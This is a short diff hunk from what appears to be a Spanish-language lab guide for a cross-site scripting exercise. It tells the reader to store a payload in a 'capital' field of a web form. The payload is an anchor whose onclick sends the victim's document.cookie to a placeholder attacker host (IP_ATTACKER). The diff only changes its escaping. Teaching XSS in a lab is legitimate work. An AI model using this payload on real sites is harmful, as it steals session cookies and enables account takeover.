@@ -111,7 +111,7 @@ http://WEBSERVER/xss/
 y actualizar la capital de un pais, en el campo capital poner este codigo
 
 
-<a href=# onclick="document.location='http://IP_ATACKER/xss.php?c='+escape(document.cookie);">NOMBRE_CAPITAL</a>
+<a href=# onclick=\"document.location=\'http://IP_ATTACKER/xss.php?c=\'+escape\(document.cookie\)\;\">Capital</a>
 
 Verificar que todo se encuentre ok luego salir del sistema haciendo click en "logout"
 
